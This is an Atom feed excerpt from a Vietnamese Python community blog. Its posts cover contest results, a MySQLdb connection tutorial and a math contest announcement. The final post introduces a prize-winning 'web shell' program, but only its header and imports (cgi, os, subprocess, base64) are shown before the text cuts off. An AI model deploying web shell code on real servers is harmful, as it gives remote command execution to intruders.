&lt;p&gt;Với nội dung thi gần gũi, dễ tiếp cận nhưng cũng không kém phần hấp dẫn, cuộc thi đã thu hút sự tham gia đông đảo hơn rất nhiều so với hai cuộc thi trước. Chất lượng cuộc thi rất cao khi hầu hết các thí sinh đều tìm ra được công thức cho phép tính nhanh các cặp số, một số kỹ thuật về multi-processing cũng được các thí sinh tìm hiểu và tận dụng rất hiệu quả. Bài của bạn Nhâm Xuân Nam đã đạt được kết quả cách biệt với số &lt;tt class="docutils literal"&gt;n&lt;/tt&gt; lớn nhất dài hơn 2100 chữ số!&lt;/p&gt;
&lt;p&gt;Nói về bài thi đoạt giải nhất, bạn Hoàng Quốc Thịnh - người đạt giải nhất cuộc thi đầu tiên - và anh Nguyễn Thành Nam đều chung một nhận định:&lt;/p&gt;
&lt;blockquote&gt;
Một bài thi chuẩn mực, không có gì phải phàn nàn cả!&lt;/blockquote&gt;
&lt;p&gt;Mã nguồn của các bài dự thi cùng với chương trình chấm có thể được tải về tại &lt;a class="reference external" href="http://www.vithon.org/static/pell.zip"&gt;đây&lt;/a&gt;. Hình sau là ảnh của lễ trao giải. Bạn Lê Ngọc Hiếu đại diện cho nhóm PCNV bên phải, trao tặng giải thưởng cho người chiến thắng bên trái.&lt;/p&gt;
&lt;img alt="" src="/static/pell.contest.png" /&gt;
&lt;p&gt;Một lần nữa xin chúc mừng bạn Nhâm Xuân Nam!&lt;/p&gt;
</content></entry><entry><title>MySQLdb - Thiết lập kết nối</title><link href="/2010/05/mysqldb-thiet-lap-ket-noi.html" rel="alternate"></link><published>2010-05-31T16:55:00+07:00</published><updated>2010-05-31T16:55:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2010-05-31:/2010/05/mysqldb-thiet-lap-ket-noi.html</id><summary type="html">&lt;p&gt;MySQLdb là một wrapper của thư viện MySQL C API: &lt;tt class="docutils literal"&gt;_mysql&lt;/tt&gt;. Nó cho phép bạn viết các ứng dụng Python khả chuyển (portable) chạy trên nhiều môi trường khác nhau để truy cập vào máy chủ có hệ quản trị CSDL MySQL.&lt;/p&gt;
&lt;p&gt;Bài viết sau đây đề cập một số …&lt;/p&gt;</summary><content type="html">&lt;p&gt;MySQLdb là một wrapper của thư viện MySQL C API: &lt;tt class="docutils literal"&gt;_mysql&lt;/tt&gt;. Nó cho phép bạn viết các ứng dụng Python khả chuyển (portable) chạy trên nhiều môi trường khác nhau để truy cập vào máy chủ có hệ quản trị CSDL MySQL.&lt;/p&gt;
&lt;p&gt;Bài viết sau đây đề cập một số khía cạnh liên quan tới thiết lập kết nối CSDL. Đó là vấn đề quan trọng đầu tiên khi làm việc với bất kỳ hệ quản trị CSDL nào.&lt;/p&gt;
&lt;p&gt;Bản cài đặt MySQLdb có thể download trên trang: &lt;a class="reference external" href="http://sourceforge.net/projects/mysql-python/"&gt;http://sourceforge.net/projects/mysql-python/&lt;/a&gt;. Download có sẵn cho các nền tảng windows 32 bit và các họ unix. Đáng tiếc là MySQLdb hiện chỉ sử dụng cho các phiên bản python từ 2.3 đến 2.6.&lt;/p&gt;
&lt;div class="section" id="hello-world"&gt;
&lt;h2&gt;Hello World&lt;/h2&gt;
&lt;p&gt;Giả thiết trên máy của bạn đã cài MySQL với cổng mặc định (3306) và account root không cần password. Đoạn chương trình sau minh họa một kết nối đơn giản nhất có thể. Nó in ra các db có trong CSDL này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;root&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHOW DATABASES&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;6L&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchall&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;((&amp;#39;information_schema&amp;#39;,), (&amp;#39;cdcol&amp;#39;,), (&amp;#39;mysql&amp;#39;,), (&amp;#39;phpmyadmin&amp;#39;,), (&amp;#39;test&amp;#39;,))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="ket-noi-theo-ip"&gt;
&lt;h2&gt;Kết nối theo IP&lt;/h2&gt;
&lt;p&gt;Truy cập từ xa đến một hệ thống phức tạp hơn, bạn cần biết các tham số:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Máy chủ chứa MySQL (mặc định: &lt;tt class="docutils literal"&gt;localhost&lt;/tt&gt; hay &lt;tt class="docutils literal"&gt;127.0.0.1&lt;/tt&gt;)&lt;/li&gt;
&lt;li&gt;Cổng truy cập vào MySQL (mặc định: 3306)&lt;/li&gt;
&lt;li&gt;User, Password mà bạn được cấp&lt;/li&gt;
&lt;li&gt;Tên CSDL bạn muốn truy cập&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ví dụ sau in ra các bảng của CSDL &lt;tt class="docutils literal"&gt;mydb&lt;/tt&gt; trên máy &lt;tt class="docutils literal"&gt;192.168.90.31&lt;/tt&gt; với cổng 3310:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;you&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mydb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mypw&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; \
&lt;span class="go"&gt;      host=&amp;quot;192.168.90.31&amp;quot;, port=3310)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHOW TABLES&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchall&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="ket-noi-theo-unix-socket"&gt;
&lt;h2&gt;Kết nối theo UNIX socket&lt;/h2&gt;
&lt;p&gt;Trên các localhost cho phép dùng UNIX socket bạn có thể viết:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;db = MySQLdb.connect(db=&amp;quot;test&amp;quot;, user=&amp;quot;hoaiptm&amp;quot;, passwd=&amp;quot;hoaiptm&amp;quot;, \&lt;/span&gt;
&lt;span class="go"&gt;                     unix_socket=&amp;quot;/opt/hoaiptm/mysql/mysql.sock&amp;quot;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Truy cập MySQL qua các socket trên unix tương tự như named pipe trên windows. Nó cho phép các ứng dụng localhost tạo các kết nối cực kỳ nhanh đến CSDL. Nếu bạn chưa hiểu rõ về socket bạn có thể đọc: &lt;a class="reference external" href="http://beej.us/guide/bgipc/output/html/multipage/unixsock.html"&gt;http://beej.us/guide/bgipc/output/html/multipage/unixsock.html&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="giau-password"&gt;
&lt;h2&gt;Giấu password&lt;/h2&gt;
&lt;p&gt;Các ví dụ trên đây đều yêu cầu phải có password đặt trong mã nguồn Python. MySQLdb cho phép bạn giấu chúng trong một nơi mà chỉ bạn được phép truy cập:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;db = MySQLdb.connect(db=&amp;quot;yourdb&amp;quot;, read_default_file=&amp;quot;/home/hoaiptm/mysql.ini&amp;quot;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;tập tin options &lt;tt class="docutils literal"&gt;/home/hoaiptm/mysql.ini&lt;/tt&gt; có thể có nội dung như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
[client]
port=3310
socket=/opt/hoaiptm/mysql/mysql.sock
user=hoaiptm
password=hoaiptm
&lt;/pre&gt;
&lt;p&gt;Hướng dẫn về các option này có thể đọc trong tài liệu: &lt;a class="reference external" href="http://www.yellis.net/docs/mysql/manuel_Option_files.html#Option_files"&gt;http://www.yellis.net/docs/mysql/manuel_Option_files.html#Option_files&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="thay-doi-charset-mac-dinh"&gt;
&lt;h2&gt;Thay đổi charset mặc định&lt;/h2&gt;
&lt;p&gt;Các kết nối trong các ví dụ trên sử dụng charset mặt định là &lt;strong&gt;latin1&lt;/strong&gt;, do đó bạn không lấy được các dữ liệu tiếng Việt. Chẳng hạn bạn tạo một bảng &lt;strong&gt;user&lt;/strong&gt; với chartset &lt;strong&gt;utf8&lt;/strong&gt; trong CSDL &lt;strong&gt;test&lt;/strong&gt; như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
USE `test`;
CREATE TABLE `user` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `account` varchar(50) DEFAULT NULL,
  `fullname` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 **DEFAULT CHARSET=utf8** ROW_FORMAT=DYNAMIC;
INSERT INTO `user` VALUES (1,'hoaiptm','Phạm Thị Minh Hoài');
INSERT INTO `user` VALUES (2,'trangnt','Ngô Thu Trang');
&lt;/pre&gt;
&lt;p&gt;Sau đó cố gắng lấy dữ liệu từ bảng user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hoaiptm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hoaiptm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3310&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT fullname FROM user&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;2L&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchall&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;((&amp;#39;Ph?m Th? Minh Ho\xe0i&amp;#39;,), (&amp;#39;Ng\xf4 Thu Trang&amp;#39;,))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Các dấu &lt;tt class="docutils literal"&gt;?&lt;/tt&gt; cho thấy các ký tự utf8 đã không được truyền tải đúng. Để giải quyết vấn đề này chúng ta thêm tùy chọn &lt;strong&gt;charset = &amp;quot;utf8&amp;quot;&lt;/strong&gt; trong connection:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hoaiptm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hoaiptm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; \
&lt;span class="go"&gt;      port=3310, charset=&amp;quot;utf8&amp;quot;)&lt;/span&gt;
&lt;span class="gp"&gt;...&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchall&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;((u&amp;#39;Ph\u1ea1m Th\u1ecb Minh Ho\xe0i&amp;#39;,), (u&amp;#39;Ng\xf4 Thu Trang&amp;#39;,))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lúc này tất cả các dữ liệu trong trường text, char, varchar đều được trả về dạng unicode.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="yeu-cau-tra-ve-tu-dien"&gt;
&lt;h2&gt;Yêu cầu trả về từ điển&lt;/h2&gt;
&lt;p&gt;MySQLdb cho phép trả về các kết quả dạng từ điển, để làm được điều đó bạn thêm tùy chọn &lt;strong&gt;cursorclass=MySQLdb.cursors.DictCursor&lt;/strong&gt;. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hoaiptm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hoaiptm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3310&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; \
&lt;span class="go"&gt;      charset=&amp;quot;utf8&amp;quot;, cursorclass=MySQLdb.cursors.DictCursor)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;select * from user&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;2L&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchall&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;({&amp;#39;account&amp;#39;: u&amp;#39;hoaiptm&amp;#39;, &amp;#39;fullname&amp;#39;: u&amp;#39;Ph\u1ea1m Th\u1ecb Minh Ho\xe0i&amp;#39;, &amp;#39;Id&amp;#39;: 1L}, \&lt;/span&gt;
&lt;span class="go"&gt; {&amp;#39;account&amp;#39;: u&amp;#39;trangnt&amp;#39;, &amp;#39;fullname&amp;#39;: u&amp;#39;Ng\xf4 Thu Trang&amp;#39;, &amp;#39;Id&amp;#39;: 2L})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Chương trình sẽ chạy chậm đi chút xíu, nhưng bù lại kết quả trả về rất dễ sử dụng.&lt;/p&gt;
&lt;/div&gt;
</content><category term="mysql"></category><category term="MySQLdb"></category><category term="CSDL"></category><category term="database connection"></category><category term="database"></category></entry><entry><title>Phát động cuộc thi Giải Toán Bằng Python</title><link href="/2010/05/phat-dong-cuoc-thi-giai-toan-bang-python.html" rel="alternate"></link><published>2010-05-24T07:32:00+07:00</published><updated>2010-05-24T07:32:00+07:00</updated><author><name>Phan Đắc Anh Huy</name></author><id>tag:None,2010-05-24:/2010/05/phat-dong-cuoc-thi-giai-toan-bang-python.html</id><summary type="html">&lt;p&gt;Sau thành công của 2 lần thi trước, nhóm PCNV tiếp tục phát động cuộc thi Giải Toán Bằng Python để chào mừng ngày quốc tề thiếu nhi đang đến rất gần. Đề thi rất đơn giản:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hãy dùng ngôn ngữ lập trình Python để tính toán và xuất ra …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;Sau thành công của 2 lần thi trước, nhóm PCNV tiếp tục phát động cuộc thi Giải Toán Bằng Python để chào mừng ngày quốc tề thiếu nhi đang đến rất gần. Đề thi rất đơn giản:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hãy dùng ngôn ngữ lập trình Python để tính toán và xuất ra các cặp số n và k thỏa mãn:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
1 + 2 + ... + n = n + 1 + n + 2 + ... + n + k
&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Input:&lt;/dt&gt;
&lt;dd&gt;Không có.&lt;/dd&gt;
&lt;dt&gt;Output:&lt;/dt&gt;
&lt;dd&gt;Standard Output.&lt;/dd&gt;
&lt;dt&gt;Output Format:&lt;/dt&gt;
&lt;dd&gt;In trên nhiều dòng, mỗi dòng là một cặp số n, k cách nhau bằng một hoặc nhiều khoảng trắng.&lt;/dd&gt;
&lt;dt&gt;Yêu cầu:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Chỉ được dùng các module built-in.&lt;/li&gt;
&lt;li&gt;Không được in ra các giá trị n, k đã tính toán sẵn trước khi chương trình thực thi dưới bất kỳ hình thức nào.&lt;/li&gt;
&lt;li&gt;Chương trình sẽ được người chấm thực thi trong vòng 30 giây. Hết thời gian này, chương trình sẽ bị ngắt.&lt;/li&gt;
&lt;li&gt;Chương trình nào in ra được nhiều cặp số n, k nhất sẽ chiến thắng.&lt;/li&gt;
&lt;li&gt;Chương trình sẽ bị loại nếu in ra bất cứ cặp số n, k nào không chính xác.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;Thời hạn dự thi: Từ ngày hôm nay (24/05/2010) đến hết ngày &lt;strong&gt;31/05/2010&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Bài dự thi xin gửi về địa chỉ email &lt;strong&gt;admin+frontpage&amp;#64;vithon.org&lt;/strong&gt; (xin vui lòng bỏ +frontpage trước khi gửi), bạn có thể gửi nhiều lần trong trường hợp cải thiện được kết quả của mình. Chương trình được gửi cuối cùng sẽ được nhóm PCNV sử dụng để chấm điểm chung cuộc.&lt;/p&gt;
&lt;p&gt;Trong quá trình làm bài, nếu có nhu cầu trao đổi, đặt câu hỏi, hay chỉ đơn giản là muốn trò chuyện với những người bạn rất dễ thương trong nhóm PCNV, các bạn có thể tham gia phòng tán gẫu &lt;tt class="docutils literal"&gt;#vithon&lt;/tt&gt; ở máy chủ &lt;tt class="docutils literal"&gt;irc.freenode.net&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Đã là cuộc thi thì không thể thiếu giải thưởng, phần thưởng cho người thắng cuộc là 100.000 VND và một buổi trò chuyện thân mật với admin nhóm PCNV.&lt;/p&gt;
</content><category term="maths"></category><category term="python"></category><category term="contest"></category></entry><entry><title>ChickenLittle Shell</title><link href="/2010/05/chickenlittle-shell.html" rel="alternate"></link><published>2010-05-19T06:41:00+07:00</published><updated>2010-05-19T06:41:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2010-05-19:/2010/05/chickenlittle-shell.html</id><summary type="html">&lt;p&gt;Nhân dịp kỷ niệm 120 năm ngày sinh lãnh tụ Hồ Chí Minh, nhóm PCNV xin gửi đến bạn đọc bài dự thi đạt giải nhất cuộc thi Web Shell Programming Contest kết thúc vào ngày 15 tháng 05 vừa qua.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;ChickenLittle Shell by Zep&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="kn"&gt;import …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Nhân dịp kỷ niệm 120 năm ngày sinh lãnh tụ Hồ Chí Minh, nhóm PCNV xin gửi đến bạn đọc bài dự thi đạt giải nhất cuộc thi Web Shell Programming Contest kết thúc vào ngày 15 tháng 05 vừa qua.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;ChickenLittle Shell by Zep&lt;/span&gt;
&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cgitb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;cgitb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;enable&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;strftime&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;

